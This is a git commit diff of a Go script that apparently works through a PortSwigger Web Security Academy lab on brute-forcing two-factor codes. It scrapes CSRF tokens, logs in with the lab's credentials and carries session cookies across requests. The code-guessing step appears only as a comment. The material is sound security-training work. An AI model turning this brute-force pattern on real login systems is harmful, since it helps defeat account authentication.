a561f5e01d040500ccc452433b8f03ecd3a70cd0
Fábio Kubo <fabio_harada@hotmail.com>
2021-09-29 00:12:49 -0300

    fix: second step to deal with cookies from first step

--- port-swigger/2fa-brute-force/go.mod
+++ port-swigger/2fa-brute-force/go.mod
@@ -1,24 +1,3 @@
 module lar/port-swigger/2fa-brute-force
 
 go 1.17
-
-require (
-	github.com/alecthomas/template v0.0.0-20190718012654-fb15b899a751 // indirect
-	github.com/alecthomas/units v0.0.0-20210927113745-59d0afb8317a // indirect
-	github.com/dave/dst v0.26.2 // indirect
-	github.com/fatih/structtag v1.2.0 // indirect
-	github.com/konsorten/go-windows-terminal-sequences v1.0.3 // indirect
-	github.com/mattn/go-colorable v0.1.10 // indirect
-	github.com/mattn/go-isatty v0.0.14 // indirect
-	github.com/mgutz/ansi v0.0.0-20200706080929-d51e80ef957d // indirect
-	github.com/segmentio/golines v0.5.0 // indirect
-	github.com/sirupsen/logrus v1.8.1 // indirect
-	github.com/x-cray/logrus-prefixed-formatter v0.5.2 // indirect
-	golang.org/x/crypto v0.0.0-20210921155107-089bfa567519 // indirect
-	golang.org/x/mod v0.5.1 // indirect
-	golang.org/x/sys v0.0.0-20210927094055-39ccf1dd6fa6 // indirect
-	golang.org/x/term v0.0.0-20210927222741-03fcf44c2211 // indirect
-	golang.org/x/tools v0.1.7 // indirect
-	golang.org/x/xerrors v0.0.0-20200804184101-5ec99f83aff1 // indirect
-	gopkg.in/alecthomas/kingpin.v2 v2.2.6 // indirect
-)
--- port-swigger/2fa-brute-force/main.go
+++ port-swigger/2fa-brute-force/main.go
@@ -1,79 +1,91 @@
 package main
 
 import (
-	"fmt"
-	"io"
-	"log"
-	"net/http"
-	"net/url"
-	"regexp"
+    "fmt"
+    "io"
+    "log"
+    "net/http"
+    "net/url"
+    "regexp"
+    "strings"
 )
 
 func solve(hostname string) {
-	/*
-	   For each code from 0000 to 9999:
-	    - GET /login -- asserts 200 and retrieve csrf token
-	    - POST /login -- use csrf token from previous step, asserts 302 and retrieve session cookie
-	    - GET /login2 -- use session cookie from previous step, asserts 200 and retrieve csrf token
-	    - POST /login2 -- use csrf token from previous step, if 302 notify success, otherwise do not notify
-	*/
+    /*
+       For each code from 0000 to 9999:
+        - GET /login -- asserts 200 and retrieve csrf token
+        - POST /login -- use csrf token from previous step, asserts 302 and retrieve session cookie
+        - GET /login2 -- use session cookie from previous step, asserts 200 and retrieve csrf token
+        - POST /login2 -- use csrf token from previous step, if 302 notify success, otherwise do not notify
+    */
 
-	for mfaCode := 0; mfaCode < 10000; mfaCode++ {
-		csrfToken := firstStep(hostname)
-		log.Printf("CSRF Token from first step: %s", csrfToken)
-		cookies := secondStep(hostname, csrfToken)
-		log.Printf("Cookies from second step: %s", cookies)
-	}
+    for mfaCode := 0; mfaCode < 10000; mfaCode++ {
+        csrfToken, cookies := firstStep(hostname)
+        log.Printf("CSRF Token from first step: %s", csrfToken)
+        cookies = secondStep(hostname, csrfToken, cookies)
+        log.Printf("Cookies from second step: %s", cookies)
+    }
 }
 
-func firstStep(hostname string) string {
-	// GET /login -- asserts 200 and retrieve csrf token
-	uri := fmt.Sprintf("%s/login", hostname)
+func firstStep(hostname string) (string, []*http.Cookie) {
+    // GET /login -- asserts 200 and retrieve csrf token
+    uri := fmt.Sprintf("%s/login", hostname)
 
-	resp, err := http.Get(uri)
-	if err != nil {
-		log.Printf("Something not right when doing the request from the first step...")
-		return "something"
-	}
+    resp, err := http.Get(uri)
+    if err != nil {
+        log.Printf("Something not right when doing the request from the first step...")
+        return "something", []*http.Cookie{}
+    }
 
-	defer resp.Body.Close()
+    defer resp.Body.Close()
 
-	responseBody, err := io.ReadAll(resp.Body)
-	if err != nil {
-		log.Printf("Something not right when processing the request from the first step...")
-	}
+    responseBody, err := io.ReadAll(resp.Body)
+    if err != nil {
+        log.Printf("Something not right when processing the request from the first step...")
+    }
 
-	bodyAsString := string(responseBody)
-
-	rgx := regexp.MustCompile(`<input required type="hidden" name="csrf" value="(.*)">`)
-	rs := rgx.FindStringSubmatch(bodyAsString)
-
-	return rs[1]
+    return findCsrfTokenInBody(string(responseBody)), resp.Cookies()
 }
 
-func secondStep(hostname string, csrfToken string) []*http.Cookie {
-	// POST /login -- use csrf token from previous step, asserts 302 and retrieve session cookie
-	client := &http.Client{
-		CheckRedirect: func(req *http.Request, via []*http.Request) error {
-			return http.ErrUseLastResponse
-		},
-	}
-	uri := fmt.Sprintf("%s/login", hostname)
+func secondStep(hostname string, csrfToken string, cookies []*http.Cookie) []*http.Cookie {
+    // POST /login -- use csrf token from previous step, asserts 302 and retrieve session cookie
+    uri := fmt.Sprintf("%s/login", hostname)
+    data := url.Values{"csrf": {csrfToken}, "username": {"carlos"}, "password": {"montoya"}}
 
-	resp, err := client.PostForm(
-		uri,
-		url.Values{"csrf": {csrfToken}, "username": {"carlos"}, "password": {"montoya"}},
-	)
-	if err != nil {
-		log.Printf("Something not right when doing the request from the second step...")
-	}
+    req, err := http.NewRequest(http.MethodPost, uri, strings.NewReader(data.Encode()))
+    if err != nil {
+        log.Printf("Something not right when making the request from the second step...")
+        return []*http.Cookie{}
+    }
 
-	return resp.Cookies()
+    for _, cookie := range cookies {
+        req.AddCookie(cookie)
+    }
+
+    client := &http.Client{
+        CheckRedirect: func(req *http.Request, via []*http.Request) error {
+            return http.ErrUseLastResponse
+        },
+    }
+
+    resp, err := client.Do(req)
+    if err != nil {
+        log.Printf("Something not right when doing the request from the second step...")
+    }
+
+    return resp.Cookies()
+}
+
+func findCsrfTokenInBody(body string) string {
+    rgx := regexp.MustCompile(`<input required type="hidden" name="csrf" value="(.*)">`)
+    rs := rgx.FindStringSubmatch(body)
+
+    return rs[1]
 }
 
 func main() {
-	log.SetFlags(log.LstdFlags | log.Lmicroseconds)
+    log.SetFlags(log.LstdFlags | log.Lmicroseconds)
 
-	hardcodedHostname := "https://ac4e1f231e1fc12080d45ccc00c000ff.web-security-academy.net"
-	solve(hardcodedHostname)
+    hardcodedHostname := "https://ac4e1f231e1fc12080d45ccc00c000ff.web-security-academy.net"
+    solve(hardcodedHostname)
 }
